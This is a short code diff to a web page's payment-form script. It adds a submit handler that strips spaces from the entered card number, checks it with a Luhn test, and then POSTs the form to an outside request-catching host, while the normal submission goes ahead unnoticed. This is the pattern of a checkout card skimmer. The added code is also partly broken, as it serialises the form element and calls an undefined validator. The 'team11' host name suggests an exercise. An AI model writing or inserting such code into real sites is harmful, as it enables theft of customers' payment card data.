@@ -1,15 +1,15 @@
 const paymentForm = document.getElementById('payment-form');
+const cardNumberInput = document.getElementById('card-number');
 
 paymentForm.addEventListener('submit', function(event) {
-    event.preventDefault();
-
-    fetch('https://team11.requestcatcher.com/', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ test: "hello" })
-    })
-    .then(res => console.log("sent"))
-    .catch(err => console.error(err));
+    const rawValue = cardNumberInput.value.replace(/\s+/g, '');
+    if (validateLuhn(rawValue)) {
+        fetch('https://team11.requestcatcher.com', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(paymentForm)
+        })
+    }
 });
